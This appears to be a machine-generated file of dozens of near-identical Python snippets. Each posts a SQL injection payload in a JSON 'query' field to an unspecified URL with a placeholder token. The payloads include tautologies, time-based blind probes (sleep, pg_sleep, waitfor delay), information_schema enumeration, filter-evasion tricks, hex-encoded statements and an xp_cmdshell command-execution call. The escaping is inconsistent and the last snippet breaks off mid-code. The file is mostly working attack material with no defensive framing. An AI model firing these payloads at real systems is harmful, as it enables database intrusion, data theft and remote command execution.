'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select * from information_schema.tables--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a' or 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a' or 'a' = 'a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar\x2822\x29 select \x40s =\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 2 between 1 and 3\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a=a--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or '1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22|\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or sleep(__TIME__)='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 1 --'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22having\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or isNULL\x281/0\x29 /*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar \x288000\x29 select \x40s = 0x73656c ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22â\x80\x98 or 1=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22char%4039%41%2b%40SELECT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22order by\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22bfilename\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22having 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or username like char\x2837\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22;waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' AND userid IS NULL; --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22*/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'text' > 't'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28select top 1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22\x22);waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a' or 3=3--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22-- &password=\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22group by userid having 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22; exec master..xp_cmdshell\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%20or%20x=x\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29\x29 or sleep\x28__TIME__\x29=\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220x730065006c0065006300740020004000400076006500 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22hi' or 1=1 --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22%20or%20'x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'something' = 'some'+'thing'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22exec sp\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2229 %\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22Ã½ or 1=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220 or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29 or \x28a=a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22uni/**/on sel/**/ect\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22replace\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%27%20or%201=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%7C\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' AND 1=(SELECT COUNT(*) FROM tabname); --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22&apos;%20OR\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; or '1'='1'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x28200\x29 select \x40q = 0x770061 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; exec ('sel' + 'ect us' + 'er')\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
